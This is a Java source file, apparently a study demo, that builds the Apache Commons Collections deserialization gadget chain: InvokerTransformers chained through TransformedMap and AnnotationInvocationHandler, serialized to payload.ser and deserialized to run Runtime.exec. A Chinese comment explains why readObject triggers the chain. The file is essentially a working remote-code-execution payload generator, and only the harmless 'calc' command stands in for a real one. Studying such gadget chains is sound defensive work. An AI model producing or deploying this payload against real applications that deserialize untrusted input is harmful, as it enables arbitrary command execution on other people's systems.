package demo;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
/*
上面的TransformedMap的setValue()还是LazyMap的get()方法都是需要手动调用。现在希望的是在序列化数据反序列化时，执行readObject()方法，并自动触发。

这里配合我们执行代码的类就是 AnnotationInvocationHandler，该类是java运行库中的一个类，并且包含一个Map对象属性，其readObject方法有自动修改自身Map属性的操作。

  annotationType = AnnotationType.getInstance(type);//判断构造器 第一个参数是否为AnnotationType，因此使用Retention.class传入较好。
  Map<String, Class<?>> memberTypes = annotationType.memberTypes();

  for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||    // 获取的值不是annotationType类型，便会触发setValue。这里只需用简单的String即可触发。
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(               // 此处触发一系列的Transformer
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
 */
public class CommonsCollectionPayload {
    public static void main(String[] args) throws Exception {
        /*
         * Runtime.getRuntime().exec("calc");
         */
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map inMap = new HashMap();
        inMap.put("key", "value");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[] { Retention.class, outMap });
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(instance);
        oos.flush();
        oos.close();

        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        // 触发代码执行
        Object newObj = ois.readObject();
        ois.close();
    }
}
